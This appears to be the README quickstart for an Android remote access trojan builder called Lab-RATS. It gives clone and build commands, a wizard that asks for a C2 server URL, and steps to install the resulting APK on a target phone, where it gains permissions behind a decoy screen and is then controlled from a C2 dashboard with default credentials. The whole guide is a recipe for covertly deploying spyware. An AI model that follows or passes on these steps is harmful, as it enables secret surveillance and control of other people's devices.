# 00 ⏤ 3-Minute Quickstart Guide

Get Lab-RATS built, deployed, and connected in under 3 minutes.

---

## Step 1: Clone the Repository

Open your terminal or command prompt and clone the project:

```bash
git clone https://github.com/K4N3CO/Lab-RATS.git
cd Lab-RATS/apk-builder
```

---

## Step 2: Build the Application

### On Linux / macOS:
```bash
chmod +x build.sh
./build.sh
```

### On Windows:
Double-click `build.bat` or run in PowerShell:
```powershell
.\build.ps1
```

The builder wizard will check your Java installation, generate a signing key, prompt for your preferred app name and C2 server URL, and compile your APK into `apk-builder/output/signed_v1.apk`.

---

## Step 3: Deploy & Connect

1. Install `signed_v1.apk` on the target Android phone.
2. Open the app **once** to grant initial permissions behind the decoy screen.
3. Access your C2 web dashboard on Render (`https://your-c2-name.onrender.com`) or locally at `http://[device-ip]:9191` using default credentials (`admin1337` or your custom password).
